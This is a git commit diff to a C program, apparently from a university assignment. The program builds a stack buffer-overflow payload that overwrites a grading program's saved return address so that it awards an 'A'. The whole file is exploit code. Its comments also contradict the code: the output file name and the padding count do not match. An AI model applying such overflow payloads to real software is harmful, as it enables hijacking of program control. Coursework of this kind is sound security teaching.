0ecad4ad5918640af5714fae98a53c94229762d8
gracesmiles <gb5279@princeton.edu>
2025-12-11 02:54:55 -0500

    Add comments to createdataA.c, start its outline, adjust memorymap to hex

--- createdataA.c
+++ createdataA.c
@@ -1,24 +1,38 @@
+/*--------------------------------------------------------------------*/
+/* createdataA.c                                                      */
+/* Author: Ariel Yuan, Grace Best.                                    */
+/* Purpose: "Produces a file called dataA with the student name, a    */
+/* nullbyte, the address of the malicious instruction in an array     */
+/* element of name[] to get an A, which will overwrite getName's      */
+/* stored x30 and padding to overrun the stack.                       */
+/*--------------------------------------------------------------------*/
+
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
 #include <miniassembler.h>
 
+/* This is supposed to be the comment before main? Returns 0.  */
+
 FILE *psFILE;
 int main(void)
 {
     int i;
-    unsigned long ulData;
+    unsigned long ulData = 0x420068;   // Address of A instruction
     psFILE = fopen("dataB", "w");
-    fprintf(psFILE, "Ariel & Grace");
-    for(i = 0; i < 1; i++)
-    {
-        fprintf(psFILE, "%c", '\0');
-    }
-    for (i = 0; i < 34; i++)
+    fprintf(psFILE, "Ariel & Grace");   // Write our names to file
+    fprintf(psFILE, "%c", '\0');     // Write null byte after name
+    
+
+    // Overwrite getName's stored x30 w/ instruction to get a A
+    fwrite(&ulData, sizeof(unsigned long), 1, psFILE);
+
+    // Write padding of 34 characters to overrun stack
+    for (i = 0; i < 17; i++)
     {
         fprintf(psFILE, "%c", 'a');
     }
-    fwrite(&ulData, sizeof(unsigned long), 1, psFILE);
+
     fclose(psFILE);
     return 0;
 }
